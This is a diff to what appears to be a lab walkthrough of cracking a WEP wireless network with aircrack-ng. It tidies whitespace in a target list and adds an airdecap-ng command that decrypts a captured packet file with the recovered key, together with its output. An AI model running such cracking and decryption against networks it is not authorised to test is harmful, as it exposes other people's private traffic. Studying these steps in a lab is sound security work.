@@ -145,7 +145,7 @@ Read 92091 packets.
                                                                                                         
    1  6C:70:9F:DE:66:89  TH3PAD                    WPA (0 handshake)                                    
    2  88:1F:A1:32:A7:F9  Vulnerable Bank           WPA (0 handshake)                                    
-   3  85:4D:68:07:4D:8F  wep                       WEP (98468 IVs)                                                          
+   3  85:4D:68:07:4D:8F  wep                       WEP (98468 IVs)                                 
    4  00:1C:DF:B2:E6:47  jeff                      WPA (0 handshake)                                       
                                                                                                         
 Index number of target network ? 3                                                                      
@@ -178,5 +178,15 @@ Starting PTW attack with 98468 ivs.
         Decrypted correctly: 100%
 ```
 
+#### Decrypting Captured Traffic
 
-
+```bash
+root@vipertooth:~# airdecap-ng -w E2:28:9E:0F:19:4A:B7:1A:9F:33:53:55:54 wep.pcap
+Total number of packets read         92091
+Total number of WEP data packets     85824
+Total number of WPA data packets         3
+Number of plaintext data packets        14
+Number of decrypted WEP  packets     83972
+Number of corrupted WEP  packets         0
+Number of decrypted WPA  packets         0
+```
